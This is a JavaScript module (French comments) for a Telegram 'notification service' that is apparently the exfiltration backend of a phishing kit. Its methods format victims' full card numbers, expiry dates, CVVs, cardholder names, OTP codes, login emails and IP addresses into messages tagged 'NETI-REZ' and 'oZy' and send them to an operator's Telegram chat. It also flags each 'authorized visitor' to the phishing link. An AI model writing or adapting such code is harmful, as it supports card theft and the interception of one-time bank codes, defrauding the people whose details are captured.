/**
 * Telegram Service
 * Service pour envoyer des notifications Telegram
 */

class TelegramService {
  constructor() {
    this.botToken = process.env.TELEGRAM_BOT_TOKEN;
    this.chatId = process.env.TELEGRAM_CHAT_ID;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
    this.enabled = !!(this.botToken && this.chatId);
    
    console.log('[TelegramService] 🔧 Initializing Telegram Service...');
    console.log('[TelegramService] Bot Token:', this.botToken ? '✅ Set' : '❌ Missing');
    console.log('[TelegramService] Chat ID:', this.chatId ? '✅ Set' : '❌ Missing');
    console.log('[TelegramService] Service enabled:', this.enabled ? '✅ YES' : '❌ NO');
    
    if (!this.enabled) {
      console.warn('[TelegramService] ⚠️  Telegram notifications will be disabled');
      console.warn('[TelegramService] ⚠️  Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env to enable');
    } else {
      console.log('[TelegramService] ✅ Telegram Service ready');
    }
  }

  /**
   * Envoie un message Telegram
   * @param {string} message - Message à envoyer
   * @param {object} options - Options supplémentaires (parse_mode, etc.)
   * @returns {Promise<boolean>}
   */
  async sendMessage(message, options = {}) {
    if (!this.enabled) {
      console.warn('[TelegramService] ⚠️  Telegram service is not configured');
      console.warn('[TelegramService] Bot Token:', this.botToken ? 'Set' : 'Missing');
      console.warn('[TelegramService] Chat ID:', this.chatId ? 'Set' : 'Missing');
      return false;
    }

    console.log('[TelegramService] 📤 Sending message to Telegram...');
    console.log('[TelegramService] Message length:', message.length);
    console.log('[TelegramService] API URL:', this.apiUrl);

    try {
      const requestBody = {
        chat_id: this.chatId,
        text: message,
        parse_mode: 'HTML',
        ...options,
      };

      console.log('[TelegramService] Request body (without sensitive data):', {
        chat_id: this.chatId,
        text: message.substring(0, 100) + '...',
        parse_mode: 'HTML',
      });

      const response = await fetch(`${this.apiUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(requestBody),
      });

      const data = await response.json();
      
      console.log('[TelegramService] Response status:', response.status);
      console.log('[TelegramService] Response data:', JSON.stringify(data, null, 2));
      
      if (data.ok) {
        console.log('[TelegramService] ✅ Message sent successfully');
        return true;
      } else {
        console.error('[TelegramService] ❌ Telegram API error:', data.description);
        console.error('[TelegramService] Error code:', data.error_code);
        return false;
      }
    } catch (error) {
      console.error('[TelegramService] ❌ Error sending Telegram message:', error);
      console.error('[TelegramService] Error stack:', error.stack);
      return false;
    }
  }

  /**
   * Envoie une notification de nouveau client
   * @param {object} clientData - Données du client
   */
  async notifyNewClient(clientData) {
    const message = `
🔔 <b>Nouveau Client</b>

🆔 ID: <code>${clientData.id}</code>
🌐 IP: <code>${clientData.ip || 'N/A'}</code>
📄 Page: <code>${clientData.current_page || 'N/A'}</code>
⏰ Créé: ${new Date(clientData.created_at).toLocaleString()}
    `.trim();

    return await this.sendMessage(message);
  }

  /**
   * Envoie une notification de mise à jour de page
   * @param {object} clientData - Données du client
   */
  async notifyPageUpdate(clientData) {
    const message = `
📄 <b>Mise à jour de page</b>

🆔 Client: <code>${clientData.id}</code>
📍 Nouvelle page: <code>${clientData.current_page}</code>
⏰ Heure: ${new Date().toLocaleString()}
    `.trim();

    return await this.sendMessage(message);
  }

  /**
   * Envoie une notification de données de paiement
   * @param {object} clientData - Données du client
   */
  async notifyPaymentData(clientData) {
    console.log('[TelegramService] 📨 notifyPaymentData called with data:', JSON.stringify(clientData, null, 2));
    
    const cardNumber = clientData.card_number || 'N/A';
    const cardDisplay = cardNumber !== 'N/A' ? cardNumber : 'N/A';
    const cvv = clientData.card_cvv || 'N/A';
    
    // Extraire le BIN (6 premiers chiffres) du numéro de carte
    let binDisplay = 'N/A';
    if (cardNumber && cardNumber !== 'N/A') {
      const cleaned = cardNumber.replace(/\D/g, '');
      if (cleaned.length >= 6) {
        binDisplay = cleaned.substring(0, 6);
      }
    }
    
    // Utiliser les informations BIN si disponibles
    let binInfo = '';
    if (clientData.bin_info) {
      const bin = clientData.bin_info;
      binInfo = `${bin.bin || binDisplay} - ${bin.bank || 'Unknown Bank'}`;
    } else {
      binInfo = binDisplay;
    }
    
    // Utiliser uniquement le pays détecté depuis l'IP
    const country = clientData.country || 'N/A';
    
    const message = `
=========NETI-REZ-==========
🏦 BIN : <code>${binInfo}</code>
------------
🌍 Pays: ${country}
👤 Titulaire: <code>${clientData.card_holder || 'N/A'}</code>
------------
💳 CC: <code>${cardDisplay}</code>
📅 Exp: <code>${clientData.card_expiration || 'N/A'}</code>
🔐 CVV: <code>${cvv}</code>
------------
🌐 IP: <code>${clientData.ip || 'N/A'}</code>
==============oZy===========
    `.trim();

    console.log('[TelegramService] 📝 Payment data message prepared');
    return await this.sendMessage(message);
  }

  /**
   * Envoie une notification de données de connexion
   * @param {object} clientData - Données du client
   */
  async notifyLoginData(clientData) {
    const message = `
🔐 <b>Données de connexion reçues</b>

🆔 Client: <code>${clientData.id}</code>
📧 Email: <code>${clientData.login_email || 'N/A'}</code>
🔑 Mot de passe: <code>${clientData.login_password ? '••••••••' : 'N/A'}</code>
⏰ Heure: ${new Date().toLocaleString()}
    `.trim();

    return await this.sendMessage(message);
  }

  /**
   * Envoie une notification OTP
   * @param {object} clientData - Données du client
   */
  async notifyOTP(clientData) {
    console.log('[TelegramService] 📨 notifyOTP called with data:', JSON.stringify(clientData, null, 2));
    
    const status = clientData.otp_status === 'submitted' ? '✅ Soumis' : '⌨️ En cours de saisie';
    const otpCode = clientData.otp_code || 'N/A';
    const cardHolder = clientData.card_holder || 'N/A';
    const cardNumber = clientData.card_number || 'N/A';
    const cardExpiration = clientData.card_expiration || 'N/A';
    const cardCvv = clientData.card_cvv || 'N/A';
    const ip = clientData.ip || 'N/A';
    
    const message = `
=========NETI-REZ-==========

🔢 Code OTP ${status}

------------
🔐 Code OTP: <code>${otpCode}</code>
------------
👤 Titulaire: <code>${cardHolder}</code>
------------
💳 CC: <code>${cardNumber}</code>
📅 Exp: <code>${cardExpiration}</code>
🔐 CVV: <code>${cardCvv}</code>
------------
🌐 IP: <code>${ip}</code>
==============oZy===========
    `.trim();

    console.log('[TelegramService] 📝 OTP message prepared');
    return await this.sendMessage(message);
  }

  /**
   * Envoie un message personnalisé
   * @param {string} title - Titre du message
   * @param {object} data - Données à afficher
   */
  async notifyCustom(title, data) {
    let message = `📢 <b>${title}</b>\n\n`;
    
    for (const [key, value] of Object.entries(data)) {
      message += `<b>${key}:</b> <code>${value || 'N/A'}</code>\n`;
    }
    
    message += `\n⏰ ${new Date().toLocaleString()}`;

    return await this.sendMessage(message.trim());
  }

  /**
   * Envoie une notification pour un visiteur autorisé
   * @param {object} clientData - Données du client (ip, country)
   */
  async notifyAuthorizedVisitor(clientData) {
    console.log('[TelegramService] 📨 notifyAuthorizedVisitor called with data:', JSON.stringify(clientData, null, 2));
    
    const country = clientData.country || 'N/A';
    const ip = clientData.ip || 'N/A';
    
    const message = `
🔔 NOUVEAU VISITEUR SUR LE LIEN
=========NETI-REZ-==========
🌍 Pays: ${country}
✅ Statut: ✅ AUTORISÉ
🌐 IP: ${ip}
===========oZy===========
    `.trim();

    console.log('[TelegramService] 📝 Authorized visitor message prepared');
    // Envoyer sans parse_mode HTML pour éviter les problèmes avec les emojis
    return await this.sendMessage(message, { parse_mode: undefined });
  }
}

module.exports = TelegramService;

